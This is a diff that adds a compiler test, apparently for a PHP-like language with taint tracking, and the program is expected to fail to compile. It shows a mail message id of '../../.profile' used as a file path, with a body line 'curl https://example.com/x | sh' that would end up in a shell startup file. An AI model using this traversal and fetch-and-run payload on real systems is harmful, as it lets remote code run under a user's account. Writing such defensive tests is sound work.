@@ -1,0 +1,13 @@
+<?nvs
+// Attack: a program saves each message in a file named after its id, and the id is `../../.profile`.
+// The sender wrote the id, so it is tainted. A tainted path does not compile, so this program should not compile.
+// hostile: expect-refusal
+
+use Core\IO;
+use Core\Mail\Message;
+
+// 1. The id starts with `../`, so the path points at a file outside the folder.
+Message $mail = Message::parse("Message-ID: <../../.profile>\r\nSubject: hi\r\n\r\ncurl https://example.com/x | sh\n");
+string $folder = IO::createTemporaryDirectory();
+IO::write($folder . '/' . ($mail->messageId() ?? 'none'), $mail->raw());
+echo "1 written\n";
